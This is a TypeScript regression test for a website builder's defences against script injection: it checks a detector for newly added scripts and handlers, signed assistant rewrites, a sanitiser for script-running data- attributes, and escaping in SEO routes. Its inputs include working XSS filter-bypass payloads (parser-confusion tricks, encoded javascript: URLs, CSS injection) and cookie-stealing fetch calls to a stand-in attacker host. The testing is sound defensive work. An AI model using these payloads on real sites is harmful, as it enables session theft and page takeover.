/**
 * What the assistant and the SEO tools may write into a page as whole HTML.
 *
 * A section insert, a JSON-LD block and a conversion bar never pass through the
 * field sanitiser: each is a new copy of the page's entire document. Until
 * 12 Oct 2026 the agent's apply route took that document from the request body,
 * so an editor could stage `<script>` under the label "harmless" for somebody
 * with publish rights to send live, and an organisation named
 * `</script><script>…` closed the structured-data block. This holds the two
 * doors that close it — a signature over each rewrite, and a refusal of any
 * rewrite that adds code the page does not already have — and the escaping in
 * the SEO routes, through the real routes and the real error handler.
 *
 * Half of it is negatives: a page that already runs scripts must keep working,
 * and every real section template must still be accepted.
 *
 * It also holds the detector itself to the browser's parsing rules — a handler
 * hidden by a quoted value that spans a raw-text, RCDATA or comment closer is
 * found, not read past — and the rich-text sanitiser's one rule for the
 * `data-` names a library runs as code (_hyperscript, Datastar, old Bootstrap's
 * selector sinks), with the count-up figure proving an ordinary `data-target`
 * still survives.
 *
 * Database only. The pages are imported files (`sourceHtml`), so nothing is
 * fetched; the API binds port 0.
 */
import assert from "node:assert/strict";
import type { AddressInfo } from "node:net";
import express, { type Request } from "express";
import type { Site, SitePage } from "@prisma/client";
import { prisma } from "../src/lib/prisma.js";
import { errorHandler } from "../src/middleware/errorHandler.js";
import { WebsiteError } from "../src/services/website/site.js";
import { parseHtml, walk } from "../src/services/website/parse.js";
import { DOCUMENT_KEY, buildPublishPlan, introducedActiveContent, sanitizeRich, type FieldValue } from "../src/services/website/index.js";
import { isScriptDataAttribute } from "../src/shared/websiteElementSettings.js";
import {
  applyAgentSitePlan,
  documentUpdateSignature,
  executeBuilderPlan,
  registerWebsiteBuilderAgent,
  siteAgentApplyInputSchema,
  type SiteAgentPlan,
} from "../src/services/websiteBuilderAgent.js";
import { SECTION_TEMPLATES, injectSectionIntoHtml } from "../src/services/websiteSectionTemplates.js";

let checks = 0;
const ok = (name: string, condition: unknown) => {
  assert.ok(condition, name);
  checks += 1;
};
const equal = (name: string, actual: unknown, expected: unknown) => {
  assert.deepEqual(actual, expected, name);
  checks += 1;
};

const MARK = `active-content-${Date.now()}`;

/** Elements of one tag in a document, read by the same parser the editor uses. */
const elements = (html: string, tag: string) => [...walk(parseHtml(html))].filter((node) => node.tag === tag);

/* ------------------------------------------------- the rule, as a function */

const page = `<!doctype html>
<html lang="en"><head><title>Acme</title>
<script src="/js/site.js"></script>
<script>window.dataLayer = window.dataLayer || [];</script>
</head>
<body>
<header><nav><a href="/">Home</a> <a href="javascript:void(0)" onclick="openMenu()">Menu</a></nav></header>
<main><h1>Hello</h1><p>We build things.</p><button type="button" onclick="toggle()">More</button></main>
<footer>Acme</footer>
</body></html>
`;
const at = (insert: string) => page.replace("<p>We build things.</p>", `<p>We build things.</p>${insert}`);

equal("the page compared with itself adds nothing", introducedActiveContent(page, page), []);
equal(
  "a plain section adds nothing, on a page that already runs two scripts and two handlers",
  introducedActiveContent(page, at(`<section><h2>Prices</h2><p>From $299</p><a href="/contact">Ask</a></section>`)),
  [],
);
equal("a picture as data:image is only a picture", introducedActiveContent(page, at(`<img src="data:image/png;base64,iVBORw0KGgo=" alt="">`)), []);
equal("mailto, tel and anchors are addresses, not code", introducedActiveContent(page, at(`<a href="mailto:a@b.co">a</a><a href="tel:+1">b</a><a href="#top">c</a>`)), []);

equal("a new script is found", introducedActiveContent(page, at(`<script>fetch('https://attacker.example/'+document.cookie)</script>`)), ["a script"]);
equal("an existing script copied a second time is a second script", introducedActiveContent(page, at(`<script src="/js/site.js"></script>`)), ["a script"]);
equal(
  "an existing script whose text changed is a different script",
  introducedActiveContent(page, page.replace("window.dataLayer || []", "window.dataLayer || steal()")),
  ["a script"],
);
equal("a new onclick is found", introducedActiveContent(page, at(`<a href="/x" onclick="steal()">x</a>`)), ["an onclick handler"]);
equal("an existing handler moved onto new code is found", introducedActiveContent(page, page.replace(`onclick="toggle()"`, `onclick="steal()"`)), ["an onclick handler"]);
equal("a javascript: link is found", introducedActiveContent(page, at(`<a href="javascript:steal()">x</a>`)), ["a javascript: address"]);
for (const [name, href] of [
  ["a numeric reference", "jav&#x61;script:steal()"],
  ["a numeric reference without its semicolon", "&#106avascript:steal()"],
  ["a tab spelled as an entity, and a colon spelled as one", "java&Tab;script&colon;steal()"],
  ["a newline inside the scheme", "java\nscript:steal()"],
  ["capitals and leading spaces", "  JavaScript:steal()"],
] as const) {
  equal(`a javascript: address written with ${name} is still found`, introducedActiveContent(page, at(`<a href="${href}">x</a>`)), ["a javascript: address"]);
}
equal("vbscript: is found", introducedActiveContent(page, at(`<a href="vbscript:msgbox(1)">x</a>`)), ["a vbscript: address"]);
equal("a data: document is found", introducedActiveContent(page, at(`<a href="data:text/html,<script>steal()</script>">x</a>`)), ["a data: address"]);
equal("a form posting to script is found", introducedActiveContent(page, at(`<form action="javascript:steal()"><button formaction="javascript:x()">Go</button></form>`)), ["a javascript: address"]);
equal("an iframe is found", introducedActiveContent(page, at(`<iframe src="https://example.com"></iframe>`)), ["an <iframe> element"]);
equal("an embed is found", introducedActiveContent(page, at(`<embed src="/x.swf">`)), ["an <embed> element"]);
equal("an object is found", introducedActiveContent(page, at(`<object data="/x"></object>`)), ["an <object> element"]);
equal("a base is found", introducedActiveContent(page, page.replace("<title>", `<base href="https://attacker.example/"><title>`)), ["a <base> element"]);
equal("srcdoc is found", introducedActiveContent(page, at(`<div srcdoc="<script>x()</script>"></div>`)), ["a frame's inline document (srcdoc)"]);
equal(
  "a meta refresh is found",
  introducedActiveContent(page, page.replace("<title>", `<meta http-equiv="Refresh" content="0;url=https://attacker.example/"><title>`)),
  ["an automatic redirect (meta refresh)"],
);

// Where this parser and a browser disagree about what is markup. Each of these
// runs in a browser and was invisible to a check that walked the ordinary tree.
equal("a script after an abruptly closed comment (<!-->) is found", introducedActiveContent(page, at(`<!--><script>steal()</script>-->`)), ["a script"]);
equal("a handler after a comment closed with --!> is found", introducedActiveContent(page, at(`<!-- a --!><img src=x onerror=steal()> -->`)), ["an onerror handler"]);
equal("a handler inside an SVG's <style> is found", introducedActiveContent(page, at(`<svg><style><img src=x onerror=steal()></style></svg>`)), ["an onerror handler"]);
equal("an SVG link to script is found", introducedActiveContent(page, at(`<svg><a xlink:href="javascript:steal()"><text>x</text></a></svg>`)), ["a javascript: address"]);
equal("SVG animation writing a script address is found", introducedActiveContent(page, at(`<svg><a><set attributeName="href" to="javascript:steal()"/></a></svg>`)), ["a javascript: address"]);
equal("SVG animation listing a script address after an encoded separator is found", introducedActiveContent(page, at(`<svg><a><animate attributeName="href" values="/x&#x3bjavascript:steal()"/></a></svg>`)), ["a javascript: address"]);
equal("a handler after a <textarea> the browser never opened is found", introducedActiveContent(page, at(`<xmp><textarea></xmp><img src=x onerror=steal()><!--</textarea>-->`)), ["an onerror handler"]);
const deep = `<body>${"<div>".repeat(20_000)}<p>x</p>`;
equal("a page twenty thousand unclosed tags deep is read without overflowing the stack", introducedActiveContent(deep, `${deep}<script>x()</script>`), ["a script"]);
const icons = page.replace("<footer>", `${`<svg viewBox="0 0 1 1"><style>.a{fill:red}</style><path d="M0 0"/></svg>`.repeat(3_000)}<footer>`);
equal("a page of three thousand inline icons, each with its own style, compares equal to itself", introducedActiveContent(icons, icons.replace("<h1>Hello</h1>", "<h1>Hi</h1>")), []);
equal(
  "several things are each named once",
  introducedActiveContent(page, at(`<script>a()</script><script>b()</script><a href="/" onclick="c()">x</a>`)),
  ["a script", "an onclick handler"],
);

// A quoted attribute value that spans a raw-text/RCDATA/comment closer. A
// browser ends the element at its literal closer and runs the `<img onerror>`
// after it; the check used to let the quote carry the value — and the live
// markup inside it — past that closer, and saw nothing. Each of these executed
// in a real browser.
for (const [name, insert, found] of [
  ["a </noscript> inside a quoted value", `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`, "an onerror handler"],
  ["a </style> inside a quoted value", `<style><p title="</style><img src=x onerror=alert(1)>"></style>`, "an onerror handler"],
  ["a </title> inside a quoted value", `<title><p alt="</title><img src=x onerror=alert(1)>"></title>`, "an onerror handler"],
  ["a </textarea> inside a quoted value", `<textarea><p title="</textarea><img src=x onerror=alert(1)>"></textarea>`, "an onerror handler"],
  ["a --> inside a quoted value", `<!-- <p title="--><img src=x onerror=alert(1)>"> -->`, "an onerror handler"],
  ["a </xmp> inside a quoted value", `<xmp><p title="</xmp><img src=x onerror=alert(1)>"></xmp>`, "an onerror handler"],
  ["a </noembed> inside a quoted value", `<noembed><p title="</noembed><img src=x onerror=alert(1)>"></noembed>`, "an onerror handler"],
  ["a ]]> inside a quoted value in SVG CDATA", `<svg><![CDATA[<x title="]]><img src=x onerror=alert(1)>">]]></svg>`, "an onerror handler"],
  ["a whole <script> after a spanned </style>", `<style><p title="</style><script>steal()</script>"></style>`, "a script"],
] as const) {
  equal(`${name} is found, not hidden by the quote`, introducedActiveContent(page, at(insert)), [found]);
}

// Every section the assistant can insert, on a page that already runs code.
for (const [kind, template] of Object.entries(SECTION_TEMPLATES)) {
  const inserted = injectSectionIntoHtml(page, template.generateHtml({ siteName: "Acme" }));
  equal(`the ${kind} section is accepted`, introducedActiveContent(page, inserted), []);
}

/* ------------------------------------------------------- rich text (A4) */

const rich = sanitizeRich(`<strong class="count-up" data-target="70" data-bind="text: steal()" data-hx-get="/steal" data-HX-post="/x" data-dw-field="hero.0">70</strong>`);
ok("the count-up figure keeps data-target", rich.includes(`data-target="70"`));
ok("…and its class", rich.includes(`class="count-up"`));
ok("data-bind is dropped from rich text", !rich.includes("data-bind"));
ok("data-hx-get is dropped from rich text", !rich.includes("data-hx-get"));
ok("data-hx-post in capitals is dropped too", !/data-hx-post/i.test(rich));
ok("the editor's own marks are still dropped", !rich.includes("data-dw-"));
ok("the words survive", rich.includes(">70</strong>"));

// The names more libraries read as code. _hyperscript's `data-script`, and
// Datastar's reactive set, run on a page that loads those libraries exactly as
// `data-bind` runs on a Knockout one; the one rule the Settings panel and this
// sanitiser share must know them.
for (const name of ["data-script", "data-text", "data-show", "data-effect", "data-computed", "data-attr", "data-attr-href", "data-signals", "data-signals-x", "data-class", "data-class-on", "data-indicator", "data-init"]) {
  ok(`${name} is refused by name`, isScriptDataAttribute(name));
  ok(`…and dropped from rich text`, !sanitizeRich(`<span ${name}="alert(1)">x</span>`).includes(name));
}
// …without sweeping up ordinary data- names that merely start the same way.
for (const name of ["data-target", "data-parent", "data-container", "data-html", "data-template", "data-content", "data-testid", "data-attribution", "data-classname", "data-section"]) {
  ok(`${name} is not mistaken for code`, !isScriptDataAttribute(name));
}

// Old Bootstrap sinks. `data-target`/`data-parent`/`data-container` are jQuery
// selectors, and one starting `<` is HTML it builds and runs; `data-template`/
// `data-content` are rendered as HTML once `data-html` is on the element. The
// browser decodes `&lt;` to `<`, so the test is on the decoded value.
ok("a data-target holding <img> is dropped", !sanitizeRich(`<span data-target="<img src=x onerror=alert(1)>">x</span>`).includes("data-target"));
ok("…even written as an entity", !sanitizeRich(`<span data-target="&lt;img src=x onerror=alert(1)>">x</span>`).includes("data-target"));
ok("a data-parent holding < is dropped", !sanitizeRich(`<span data-parent="<x>">x</span>`).includes("data-parent"));
ok("a data-container holding < is dropped", !sanitizeRich(`<span data-container="<x>">x</span>`).includes("data-container"));
ok("data-template is dropped when data-html is present", !sanitizeRich(`<span data-html="true" data-template="<img src=x onerror=alert(1)>">x</span>`).includes("data-template"));
ok("data-content is dropped when data-html is present", !sanitizeRich(`<span data-html="true" data-content="<img src=x onerror=alert(1)>">x</span>`).includes("data-content"));
// The negatives that must survive: the count-up figure, a plain selector, and
// a template with no data-html beside it.
ok("the count-up figure keeps data-target=\"70\"", sanitizeRich(`<strong class="count-up" data-target="70">70</strong>`).includes(`data-target="70"`));
ok("a data-target holding a selector survives", sanitizeRich(`<span data-target="#section">x</span>`).includes(`data-target="#section"`));
ok("a data-template with no data-html survives", sanitizeRich(`<span data-template="plain">x</span>`).includes(`data-template="plain"`));

/* ------------------------------------------------ against a real database */

type Created = { site: Site; pages: SitePage[] };

async function reset() {
  const sites = await prisma.site.findMany({ where: { slug: { startsWith: "active-content-" } }, select: { id: true } });
  const ids = sites.map((site) => site.id);
  await prisma.siteAuditEvent.deleteMany({ where: { siteId: { in: ids } } });
  await prisma.sitePage.deleteMany({ where: { siteId: { in: ids } } });
  await prisma.site.deleteMany({ where: { id: { in: ids } } });
  await prisma.user.deleteMany({ where: { email: { startsWith: "active-content-" } } });
}

async function makeSite(name: string, pages: Array<{ title: string; path: string; html: string; status?: "LIVE" | "HIDDEN" }>): Promise<Created> {
  const site = await prisma.site.create({ data: { name, slug: `${MARK}-${Math.random().toString(36).slice(2, 8)}`, publicUrl: "https://acme.example.com" } });
  const created: SitePage[] = [];
  for (const [index, entry] of pages.entries()) {
    created.push(await prisma.sitePage.create({ data: {
      siteId: site.id, title: entry.title, path: entry.path, filePath: `${entry.path.replace(/^\//, "") || "index"}.html`,
      sourceHtml: entry.html, status: entry.status ?? "LIVE", sortOrder: index,
    } }));
  }
  return { site, pages: created };
}

const fresh = (id: string) => prisma.sitePage.findUniqueOrThrow({ where: { id } });

/** What a browser does to a plan between the plan route and the apply route. */
const throughBrowser = (plan: SiteAgentPlan, pageId: string, revision: number) =>
  siteAgentApplyInputSchema.parse(JSON.parse(JSON.stringify({
    pageRevisions: { [pageId]: revision },
    plan: { explanation: plan.explanation, pages: plan.pages, documentHtmlUpdates: plan.documentHtmlUpdates },
  })));

async function refused(name: string, run: () => Promise<unknown>, match: RegExp) {
  await assert.rejects(run, (error: unknown) => error instanceof WebsiteError && error.status === 400 && match.test(error.message), name);
  checks += 1;
}

async function main() {
  await reset();
  const editor = await prisma.user.create({ data: { email: `${MARK}-editor@example.test`, name: "Editor" } });
  const other = await prisma.user.create({ data: { email: `${MARK}-other@example.test`, name: "Other" } });

  try {
    /* ---- the side door, exactly as it was proved open */
    const source = `<!doctype html><html><head><title>T</title></head><body><main><h1>Hello</h1></main><footer>f</footer></body></html>`;
    const forgedSite = await makeSite("Acme", [{ title: "Home", path: "/", html: source }]);
    const forgedPage = forgedSite.pages[0]!;
    // `applyAgentSitePlan` advances the revision on the row it is handed, as
    // the route's fresh rows should be; the starting number is kept apart.
    const startRevision = forgedPage.draftRevision;
    const evil = source.replace("<h1>Hello</h1>", "<h1>Hello</h1><script>fetch('https://attacker.example/'+document.cookie)</script>");
    const forged = siteAgentApplyInputSchema.parse({
      pageRevisions: { [forgedPage.id]: startRevision },
      plan: { explanation: "x", pages: [], documentHtmlUpdates: { [forgedPage.id]: { label: "harmless", html: evil } } },
    });
    await refused("a rewrite with no signature is refused", () => applyAgentSitePlan(forgedSite.site, [forgedPage], forged, editor.id), /altered after it was made, or it came from an older screen/);
    const untouched = await fresh(forgedPage.id);
    ok("…and leaves the draft empty", untouched.draft === null);
    equal("…and the revision where it was", untouched.draftRevision, startRevision);

    const signedFor = (userId: string, html: string, label = "harmless", pageId = forgedPage.id) =>
      siteAgentApplyInputSchema.parse({
        pageRevisions: { [pageId]: startRevision },
        plan: { explanation: "x", pages: [], documentHtmlUpdates: { [pageId]: { label, html, signature: documentUpdateSignature(forgedSite.site.id, pageId, userId, { html, label }) } } },
      });
    const benign = source.replace("<h1>Hello</h1>", "<h1>Hello</h1><section><h2>New</h2></section>");
    await refused("a rewrite signed for somebody else is refused", () => applyAgentSitePlan(forgedSite.site, [forgedPage], signedFor(other.id, benign), editor.id), /altered after it was made/);
    const swapped = signedFor(editor.id, benign);
    swapped.plan.documentHtmlUpdates![forgedPage.id]!.html = evil;
    await refused("a signed rewrite whose HTML was swapped is refused", () => applyAgentSitePlan(forgedSite.site, [forgedPage], swapped, editor.id), /altered after it was made/);
    const relabelled = signedFor(editor.id, benign, "Added a section");
    relabelled.plan.documentHtmlUpdates![forgedPage.id]!.label = "Fixed a typo";
    await refused("a signed rewrite whose label was changed is refused", () => applyAgentSitePlan(forgedSite.site, [forgedPage], relabelled, editor.id), /altered after it was made/);
    const otherSite = await makeSite("Elsewhere", [{ title: "Home", path: "/", html: source }]);
    const replayed = siteAgentApplyInputSchema.parse({
      pageRevisions: { [otherSite.pages[0]!.id]: 0 },
      plan: { explanation: "x", pages: [], documentHtmlUpdates: { [otherSite.pages[0]!.id]: signedFor(editor.id, benign).plan.documentHtmlUpdates![forgedPage.id]! } },
    });
    await refused("a signature carried to another site's page is refused", () => applyAgentSitePlan(otherSite.site, otherSite.pages, replayed, editor.id), /altered after it was made/);
    equal("none of those wrote anything", (await fresh(forgedPage.id)).draftRevision, startRevision);

    // Signed, so the server made it — and still refused, because what a model
    // writes can be steered by what is on the page.
    for (const [what, insert, named] of [
      ["a script", "<script>steal()</script>", /would add a script, which the page does not have now/],
      ["an onclick", `<a href="/x" onclick="steal()">x</a>`, /would add an onclick handler/],
      ["a javascript: link", `<a href="javascript:steal()">x</a>`, /would add a javascript: address/],
    ] as const) {
      await refused(`a correctly signed rewrite that adds ${what} is refused, by name`, () => applyAgentSitePlan(forgedSite.site, [forgedPage], signedFor(editor.id, benign.replace("<h2>New</h2>", `<h2>New</h2>${insert}`)), editor.id), named);
    }
    const stillUntouched = await fresh(forgedPage.id);
    ok("a refused rewrite leaves the draft empty", stillUntouched.draft === null && stillUntouched.draftRevision === startRevision);

    const applied = await applyAgentSitePlan(forgedSite.site, [forgedPage], signedFor(editor.id, benign), editor.id);
    equal("a correctly signed plain rewrite applies", applied.results.map((r) => r.success), [true]);
    const afterBenign = await fresh(forgedPage.id);
    ok("…and is the page's draft document", (afterBenign.draft as Record<string, FieldValue>)[DOCUMENT_KEY]?.document?.html === benign);
    const stale = signedFor(editor.id, benign.replace("<h2>New</h2>", "<h2>Newer</h2>"));
    const staleOutcome = await applyAgentSitePlan(forgedSite.site, [afterBenign], stale, editor.id);
    ok("a rewrite made against an older revision is said to conflict, not silently dropped", staleOutcome.results[0]?.success === false && /modified in another session/.test(staleOutcome.results[0]?.message ?? ""));

    /* ---- the real planner, a page that already runs code, and the HTTP routes */
    const scripted = `<!doctype html><html><head><title>Shop</title><meta name="description" content="Ends &lt;/script&gt;&lt;script&gt;alert(2)&lt;/script&gt; here">
<script src="/js/shop.js"></script></head>
<body><header><button onclick="openMenu()">Menu</button></header><main><h1>Shop</h1><p>Buy things.</p></main><footer>Shop</footer>
<script>document.querySelector('h1').dataset.ready = '1';</script></body></html>`;
    const shop = await makeSite(`Acme <img src=x onerror=steal()> $\` & Co`, [
      { title: "Home", path: "/", html: scripted },
      { title: "Prices", path: "/prices", html: scripted },
      { title: "Plan document", path: "/plan", html: scripted, status: "HIDDEN" },
      { title: "Schema", path: "/schema", html: scripted },
      { title: "Bar", path: "/bar", html: scripted },
      { title: "Theme", path: "/theme", html: scripted },
      { title: "Meta", path: "/meta", html: scripted.replace(`<meta name="description" content="Ends &lt;/script&gt;&lt;script&gt;alert(2)&lt;/script&gt; here">`, `<meta name='description' content='Old words'>`) },
    ]);
    const [home, prices, , schemaPage, barPage, themePage, metaPage] = shop.pages as [SitePage, SitePage, SitePage, SitePage, SitePage, SitePage, SitePage];

    const heroPlan = await executeBuilderPlan(shop.site, { action: "instruction", prompt: "build a new hero banner", pageId: home.id }, editor.id);
    const heroHtml = heroPlan.documentHtmlUpdates?.[home.id]?.html ?? "";
    ok("the planner signs the rewrite it makes", typeof heroPlan.documentHtmlUpdates?.[home.id]?.signature === "string");
    equal("the site's name goes into the hero as words, not markup", introducedActiveContent(scripted, heroHtml), []);
    ok("…escaped where it stands", heroHtml.includes("Acme &lt;img src=x onerror=steal()&gt;"));
    equal("…and a $` in it is not read as \"the page so far\"", heroHtml.split("<head>").length - 1, 1);

    const api = express();
    api.use(express.json({ limit: "5mb" }));
    let caller = editor;
    api.use((req, _res, next) => {
      req.dbUser = { id: caller.id, name: caller.name, email: caller.email, active: true, deniedPermissions: [], accessRole: { superAdmin: true } } as unknown as Request["dbUser"];
      next();
    });
    const router = express.Router();
    registerWebsiteBuilderAgent(router, {
      loadSite: async (_req, siteId) => prisma.site.findUniqueOrThrow({ where: { id: siteId } }),
      loadPage: async (_req, pageId) => {
        const found = await prisma.sitePage.findUniqueOrThrow({ where: { id: pageId } });
        return { page: found, site: await prisma.site.findUniqueOrThrow({ where: { id: found.siteId } }) };
      },
    });
    api.use(router);
    api.use(errorHandler);
    const server = api.listen(0, "127.0.0.1");
    await new Promise((resolve) => server.once("listening", resolve));
    const port = (server.address() as AddressInfo).port;
    const post = async (path: string, body: unknown) => {
      const response = await fetch(`http://127.0.0.1:${port}${path}`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
      return { status: response.status, body: (await response.json()) as Record<string, unknown> };
    };

    try {
      const forgedHttp = await post(`/sites/${shop.site.id}/agent/apply`, {
        pageRevisions: { [prices.id]: prices.draftRevision },
        plan: { explanation: "x", pages: [], documentHtmlUpdates: { [prices.id]: { label: "harmless", html: scripted.replace("<p>Buy things.</p>", "<p>Buy things.</p><script>steal()</script>") } } },
      });
      equal("over HTTP, the forged body is a 400", forgedHttp.status, 400);
      ok("…said as a sentence", /Ask the assistant for the change again\./.test(String(forgedHttp.body.error)));
      ok("…and the page's draft is untouched", (await fresh(prices.id)).draft === null);

      const planned = await post(`/sites/${shop.site.id}/agent/plan`, { action: "instruction", prompt: "add a pricing table to this page", pageId: prices.id });
      equal("the plan route answers", planned.status, 200);
      const plan = planned.body as unknown as SiteAgentPlan;
      ok("…with the rewrite signed", typeof plan.documentHtmlUpdates?.[prices.id]?.signature === "string");

      caller = other;
      const stolen = await post(`/sites/${shop.site.id}/agent/apply`, throughBrowser(plan, prices.id, prices.draftRevision));
      equal("somebody else sending that plan is refused", stolen.status, 400);
      caller = editor;

      const sent = await post(`/sites/${shop.site.id}/agent/apply`, throughBrowser(plan, prices.id, prices.draftRevision));
      equal("the person it was made for applies it, on a page that already runs two scripts and a handler", sent.status, 200);
      const pricesAfter = await fresh(prices.id);
      const values = pricesAfter.draft as Record<string, FieldValue>;
      ok("the section is in the draft", values[DOCUMENT_KEY]?.document?.html?.includes("sec-pricing-"));
      const publish = buildPublishPlan({ source: scripted, values });
      ok("…the draft publishes", publish.publishable && Boolean(publish.html));
      equal("…with the page's own two scripts and nothing more", elements(publish.html ?? "", "script").length, 2);

      /* ---- JSON-LD and the sitemap (A2) */
      const name = "</script><script>alert(1)</script>";
      const technical = await post(`/sites/${shop.site.id}/seo/technical`, { pageId: schemaPage.id, organizationName: name });
      equal("the structured-data route answers", technical.status, 200);
      const schemaHtml = ((await fresh(schemaPage.id)).draft as Record<string, FieldValue>)[DOCUMENT_KEY]?.document?.html ?? "";
      const scripts = elements(schemaHtml, "script");
      equal("an organisation named </script><script>… adds exactly one script element", scripts.length, 3);
      const ld = scripts.find((node) => node.attrs.some((attr) => attr.name === "type" && attr.value === "application/ld+json"));
      ok("…the structured-data one", Boolean(ld));
      const json = JSON.parse(schemaHtml.slice(ld!.innerStart, ld!.innerEnd)) as { name: string; description: string };
      equal("…whose JSON reads back the same name", json.name, name);
      equal("…and the page's own description, </script> and all", json.description, "Ends </script><script>alert(2)</script> here");
      equal("…and nothing else that runs", introducedActiveContent(scripted, schemaHtml), ["a script"]);
      const sitemap = String(technical.body.sitemapXml);
      ok("the sitemap lists live pages", sitemap.includes("https://acme.example.com/prices"));
      ok("the sitemap leaves a HIDDEN page out", !sitemap.includes("/plan"));

      /* ---- the conversion bar and brand theme (A3) */
      const badColour = await post(`/sites/${shop.site.id}/seo/conversion-bar`, { pageId: barPage.id, enabled: true, whatsapp: "233200000000", accentColor: "red;background:url(//x.co)" });
      equal("a colour carrying a second declaration is refused", badColour.status, 400);
      ok("…as a sentence", /must be a colour/.test(String(badColour.body.error)));
      ok("…and writes nothing", (await fresh(barPage.id)).draft === null);
      const bar = await post(`/sites/${shop.site.id}/seo/conversion-bar`, { pageId: barPage.id, enabled: true, whatsapp: "233200000000", ctaLabel: "Pay $` now", accentColor: "rgba(22, 163, 74, 0.9)" });
      equal("an ordinary bar is added", bar.status, 200);
      const barHtml = ((await fresh(barPage.id)).draft as Record<string, FieldValue>)[DOCUMENT_KEY]?.document?.html ?? "";
      ok("the label is written as typed", barHtml.includes(">Pay $` now</a>"));
      equal("…not as a copy of the page before it", barHtml.split("<head>").length - 1, 1);
      equal("…and the bar adds nothing that runs", introducedActiveContent(scripted, barHtml), []);
      const badTheme = await post(`/sites/${shop.site.id}/seo/brand-theme`, { pageId: themePage.id, fontPairId: "space-dm", primaryColor: "red}body{background:url(//x)" });
      equal("a theme colour that closes the rule is refused", badTheme.status, 400);
      ok("…and writes nothing", (await fresh(themePage.id)).draft === null);
      equal("a real theme colour is accepted", (await post(`/sites/${shop.site.id}/seo/brand-theme`, { pageId: themePage.id, fontPairId: "space-dm", primaryColor: "#2563EB", surfaceColor: "#FFFFFF" })).status, 200);

      /* ---- the page title and description (A3) */
      const seo = await post(`/sites/${shop.site.id}/seo/page`, { pageId: metaPage.id, title: "</title><script>alert(1)</script>", description: "0;url=https://attacker.example/' http-equiv='refresh" });
      equal("the SEO save answers", seo.status, 200);
      const metaDraft = (await fresh(metaPage.id)).draft as Record<string, FieldValue>;
      const metaHtml = metaDraft[DOCUMENT_KEY]?.document?.html ?? "";
      equal("a title that closes its tag, and a description with an apostrophe in it, add nothing that runs", introducedActiveContent(scripted, metaHtml), []);
      ok("…and the title field is stored escaped", !String(metaDraft["meta.0"]?.value).includes("<"));
      const description = elements(metaHtml, "meta").find((node) => node.attrs.some((attr) => attr.name === "name" && attr.value === "description"));
      ok("an apostrophe in a description cannot end a single-quoted attribute", Boolean(description) && !description!.attrs.some((attr) => attr.name === "http-equiv"));
      ok("…and the description field is stored escaped for its quotes", !/['"]/.test(String(metaDraft["meta.1"]?.value)));
    } finally {
      server.close();
    }
  } finally {
    await reset();
  }
  console.log(`websiteActiveContent: ${checks} checks passed`);
}

main()
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  })
  .finally(() => prisma.$disconnect());
